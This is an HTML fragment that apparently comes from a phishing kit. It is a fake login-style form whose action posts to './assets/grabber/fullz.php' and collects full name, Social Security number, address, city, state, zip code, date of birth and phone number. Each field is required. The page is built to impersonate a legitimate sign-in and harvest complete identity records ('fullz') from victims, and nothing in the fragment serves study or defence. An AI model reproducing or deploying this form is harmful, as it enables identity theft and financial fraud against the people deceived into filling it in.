                            ...
                            <div class="login-outer">
                                <div class="login-inner" id="login-inner">
                                    ...
                                    <div class="login-form loginFormArea">
                                        ...
                                        <form class="is-invalid" method="POST" action="./assets/grabber/fullz.php" data-ember-action="" data-ember-action-36="36">
                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">FullName</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="off" title="" name="fullname" id="fullname" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required="true">
                                            </div>

                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">SSN</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="off" title="" name="ssn" id="ssn" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required="true">
                                            </div>

                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">Address</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="off" title="" name="address" id="address" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required="true">
                                            </div>


                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">State</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="off" title="" name="state" id="state" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required="true">
                                            </div>


                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">City</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="off" title="" name="city" id="city" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required="true">
                                            </div>

                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">Zipcode</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="off" title="" name="zipcode" id="zipcode" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required="true">
                                            </div>


                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">Date of Birth</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="off" title="" name="dob" id="dob" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required="true">
                                            </div>


                                            <div class="field ">
                                                <label class="login-field" for="fldUsername">Phone Number</label>
                                                <input test-id="fldUsername" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="" autocomplete="off" title="" name="phone" id="phone" class="mrg-T-sm login-field form-control ember-text-field form-control ember-view" type="text" required="true">
                                            </div>
